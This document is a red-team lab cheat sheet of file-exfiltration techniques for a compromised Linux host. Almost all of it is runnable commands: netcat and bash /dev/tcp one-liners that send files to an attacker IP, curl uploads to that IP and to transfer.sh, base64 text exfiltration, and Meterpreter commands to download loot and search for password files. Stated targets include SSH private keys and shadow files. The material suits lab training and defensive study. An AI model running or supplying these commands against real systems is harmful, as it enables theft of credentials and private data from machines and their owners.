# File Exfiltration / Download Methods – Red Team Lab Cheat Sheet

All examples assume:
- Target IP: 10.10.10.123
- Your Kali/attacker IP: 192.168.129.39
- File to transfer: /home/dogpics/secret.txt (or serverManager.c, id_rsa, shadow, etc.)

## 1. Python Simple HTTP Server (Fastest & Most Common)

**On Target (send file):**
```bash
# Python 3 (most common)
cd /path/containing/the/file
python3 -m http.server 8000

# Python 2 fallback (very old boxes)
python -m SimpleHTTPServer 8000
```

**On Kali (download):**
```bash
wget http://10.10.10.123:8000/secret.txt
# or
curl -O http://10.10.10.123:8000/secret.txt
```

**Pros**: One-liner, no extra tools needed on target  
**Cons**: Opens listening port (usually blocked by firewall)

## 2. Netcat (nc) – Classic Raw Transfer

**Method A – Receiver on Kali, sender on target (most reliable)**

Kali (listen):
```bash
nc -lvnp 4445 > secret.txt
```

Target (send):
```bash
nc 192.168.129.39 4445 < /home/dogpics/secret.txt
```

**Method B – Reverse direction (Kali sends, target receives – rare)**

Kali (send):
```bash
nc -lvnp 4445 < secret.txt
```

Target (receive):
```bash
nc 192.168.129.39 4445 > secret.txt
```

**Pros**: Very small binary, often already present  
**Cons**: Direction matters, no resume, firewall may block

## 3. Base64 – Text-Only Exfil (Firewall / no ports allowed)
**On Target (encode & print):**
```bash
base64 -w0 /home/dogpics/secret.txt
# -w0 = no line wrapping (important!)
```

→ Copy the entire long string from terminal output

**On Kali (decode):**
```bash
# Paste into file
echo "LONGBASE64STRINGHERE" > encoded.b64

# Decode
base64 -d encoded.b64 > secret.txt
# or one-liner if you can paste directly
echo -n "LONGBASE64STRINGHERE" | base64 -d > secret.txt
```

**Pros**: Works through restrictive outbound filtering (HTTP/SSH/DNS allowed)  
**Cons**: Manual copy-paste, size limit ~ few MB before painful

## 4. Bash /dev/tcp – No Netcat/Python Needed (Pure Bash)
**On Target (send file):**
```bash
exec 3<>/dev/tcp/192.168.129.39/4445
cat secret.txt >&3
# or one-liner
cat secret.txt > /dev/tcp/192.168.129.39/4445
```

**On Kali (receive):**
```bash
nc -lvnp 4445 > secret.txt
```

**Pros**: No extra binaries required (bash ≥ 4 usually has /dev/tcp)  
**Cons**: Not all bash versions support it, no error handling

## 5. Curl / Wget on Target (Outbound HTTP/HTTPS)
**If target has curl/wget and can reach you**

**Kali (host file):**
```bash
python3 -m http.server 8000
# or use upload server: https://github.com/transfer.sh (public) or your own
```

**Target (upload):**
```bash
curl -F "file=@secret.txt" http://192.168.129.39:8000/upload
# or to transfer.sh (public, temporary)
curl --upload-file secret.txt https://transfer.sh/secret.txt
```

## 6. Meterpreter – Full-Featured File Transfer (Metasploit Shell)
**After getting Meterpreter session** (e.g. from php/meterpreter/reverse_tcp payload)

```meterpreter
# Download file from target to Kali
download /home/dogpics/secret.txt /home/kali/loot/secret.txt

# Upload file from Kali to target
upload /home/kali/exploit.py /tmp/exploit.py

# Recursive download of whole directory
download -r /var/www/html /home/kali/loot/webroot

# Search for files
search -f *.bak
search -f password*
```

**Pros**: Encrypted channel, resume support, works behind NAT  
**Cons**: Requires Meterpreter (not always possible from dumb shell)

## Quick Decision Tree (Lab Muscle Memory)

| Situation                              | Best Method(s)                     | Priority |
|----------------------------------------|-------------------------------------|----------|
| Python3 installed                      | Python HTTP server                 | 1        |
| nc / netcat present                    | nc reverse send                    | 2        |
| Strict outbound filtering, no ports    | Base64 print → copy-paste          | 3        |
| Pure bash shell, no nc/python          | /dev/tcp one-liner                 | 4        |
| You have Meterpreter session           | `download` / `upload` commands     | God-mode |
| Need to exfil many/large files         | Python server + wget -r / curl     | Bulk     |
